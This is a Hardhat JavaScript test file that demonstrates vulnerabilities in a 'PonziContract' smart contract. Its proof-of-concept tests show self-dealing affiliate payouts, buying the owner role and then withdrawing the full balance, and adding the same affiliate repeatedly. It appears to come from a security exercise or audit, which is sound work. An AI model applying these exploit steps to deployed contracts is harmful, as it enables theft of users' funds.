const { expect } = require("chai");
const { ethers } = require("hardhat");
describe("PonziContract", function () {
  let ponzi;
  let signers;
  before(async function () {
    // getting signer
    signers = await ethers.getSigners();
    //Deploying PonziContract
    ponzi = await ethers.deployContract("PonziContract", signers[0]);
    //Getting block
    const block = await ethers.provider.getBlock();
    //Setting registrationDeadline
    await ponzi.setDeadline(block.timestamp + 1000);
    // Adding two random affiliated addresses
    await ponzi.addNewAffilliate(ethers.Wallet.createRandom().address);
    await ponzi.addNewAffilliate(ethers.Wallet.createRandom().address);
  });

  describe("joinPonzi", function () {
    it("Vulnarablity #1: allows an account to add multiple times itself butnot paying affiliated addresses", async function () {
      const affiliates = [];
      const affiliatesCount = await ponzi.affiliatesCount();

      for (let i = 0; i < affiliatesCount; i++) {
        affiliates.push(signers[1]);
      }
      const trx = await ponzi.joinPonzi(affiliates, {
        value: ethers.parseEther(`${affiliates.length}`),
      });

      const receipt = await trx.wait(1);
      expect(receipt.status).to.equal(1);
    });
  });
  describe("buyOwnerRole", function () {
    before(async function () {
      const ethAmount = await ponzi.affiliatesCount();
      // Here we get some addresses to pass to joinPonzi
      const affiliates = signers.slice(0, Number(ethAmount));
      await ponzi.connect(signers[1]).joinPonzi(affiliates, {
        value: ethers.parseEther(`${ethAmount}`),
      });
      await ponzi
        .connect(signers[1])
        .buyOwnerRole(signers[1], { value: ethers.parseEther("10") });

      const owner = await ponzi.owner();
      expect(owner).to.equal(signers[1].address);

      //Here buy ownership, so that we can test it in the next to cases
    });
    /* 
       Vulnarablity #2: allows to buy ownerRole by an affiliate by sending 10 eths and then
       the affiliate can transfer all the balance to him/herself. So this means buying ownership 
       for free. Also the account can add itself to affiliates_ list multiple times without
       paying anything.
      */

    it("Vulnarablity #2.1: allows to buy owner role and withdraw all the balance, logically just by paying trnx fees", async function () {
      const amount = await ethers.provider.getBalance(ponzi.target);
      const trx = await ponzi
        .connect(signers[1])
        .ownerWithdraw(signers[1], amount);
      const receipt = await trx.wait(1);

      expect(receipt.status).to.equal(1);
    });

    it("Vulnerability #2.2: Allows adding an account multiple times", async function () {
      let newAffiliates = [];
      // Here we push the same account N (N=100) times
      for (let i = 0; i < 100; i++) {
        newAffiliates.push(
          ponzi.connect(signers[1]).addNewAffilliate(signers[1])
        );
      }
      //Here we wait all the transactions and return them as promises, which happens fast
      const transactions = (await Promise.all(newAffiliates)).map(
        async (trx) => {
          return trx.wait(1);
        }
      );
      //Here we wait all the transactions to be mined, and get statuses
      const receipts = (await Promise.all(transactions)).map((el) => {
        return el.status;
      });
      // Here we get if all the statuses are equal to 1
      const allStatusesAreSuccess = receipts.every((val) => val === 1);

      expect(allStatusesAreSuccess).to.be.true;
    });
  });
});
